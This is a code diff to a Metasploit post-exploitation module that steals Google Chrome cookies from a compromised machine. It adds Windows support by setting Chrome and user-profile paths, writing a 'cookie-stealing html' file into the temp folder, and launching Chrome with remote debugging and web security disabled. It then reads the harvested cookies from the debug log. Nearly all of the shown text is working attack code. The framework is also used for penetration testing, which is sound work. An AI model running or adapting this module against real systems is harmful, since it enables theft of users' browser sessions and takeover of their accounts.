@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
-        OptString.new('TEMP_STORAGE_DIR', [false, 'Where to write the html used to steal cookies temporarily', '/tmp']),
+        OptString.new('TEMP_STORAGE_DIR', [true, 'Where to write the html used to steal cookies temporarily', '/tmp']),
         OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
       ]
     )
@@ -38,14 +38,17 @@ class MetasploitModule < Msf::Post
       @platform = :unix
       @chrome = 'google-chrome'
       @user_data_dir = "/home/#{session.username}/.config/google-chrome/"
+      @temp_storage_dir = datastore['TEMP_STORAGE_DIR']
     when 'osx'
       @platform = :osx
       @chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
       @user_data_dir = expand_path "/Users/#{session.username}/Library/Application Support/Google/Chrome"
+      @temp_storage_dir = datastore['TEMP_STORAGE_DIR']
     when 'windows'
-      print_error "Windows isn't supported by this module. See github.com/defaultnamehere/cookie_crimes for manual instructions."
       @platform = :windows
-      return
+      @chrome = '"\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"'
+      @user_data_dir = "\\Users\\#{session.username}\\AppData\\Local\\Google\\Chrome\\User Data"
+      @temp_storage_dir = "\\Users\\#{session.username}\\AppData\\Local\\Temp"
     else
       fail_with Failure::NoTarget, "Unsupported platform: #{session.platform}"
     end
@@ -55,15 +58,18 @@ class MetasploitModule < Msf::Post
     end
 
     @retries = datastore['MAX_RETRIES']
-    @temp_storage_dir = datastore['TEMP_STORAGE_DIR']
 
+=begin
     unless writable? @temp_storage_dir
       fail_with Failure::BadConfig, "#{@temp_storage_dir} is not writable"
     end
+=end
 
     @html_storage_path = create_cookie_stealing_html
 
-    @chrome_debugging_cmd = "#{@chrome} --headless --disable-web-security --disable-plugins --user-data-dir=\"#{@user_data_dir}\" --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']} #{@html_storage_path}"
+    @chrome_debugging_cmd = "#{@chrome}"
+    @chrome_debugging_args = @platform == :windows ? '--enable-logging --disable-gpu' : '--headless'
+    @chrome_debugging_args << " --disable-web-security --disable-plugins --user-data-dir=\"#{@user_data_dir}\" --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']} #{@html_storage_path}"
 
     nil
   end
@@ -105,7 +111,12 @@ class MetasploitModule < Msf::Post
     )
 
     # Where to temporarily store the cookie-stealing html
-    html_storage_path = File.join @temp_storage_dir, Rex::Text.rand_text_alphanumeric(10..15)
+    #html_storage_path = File.join @temp_storage_dir, Rex::Text.rand_text_alphanumeric(10..15)
+    if @platform == :windows
+      html_storage_path = "#{@temp_storage_dir}\\#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
+    else
+      html_storage_path = "#{@temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
+    end
     write_file html_storage_path, cookie_stealing_html
     html_storage_path
   end
@@ -115,7 +126,13 @@ class MetasploitModule < Msf::Post
   end
 
   def get_cookies
-    chrome_output = cmd_exec @chrome_debugging_cmd
+    if @platform == :windows
+      chrome_output_pid = cmd_exec_get_pid @chrome_debugging_cmd, @chrome_debugging_args
+      Rex::sleep(5)
+      chrome_output = read_file("#{@user_data_dir}\\chrome_debug.log")
+    else
+      chrome_output = cmd_exec @chrome_debugging_cmd, @chrome_debugging_args, 2
+    end
 
     print_status "Activated Chrome's Remote Debugging via #{@chrome_debugging_cmd}"
 
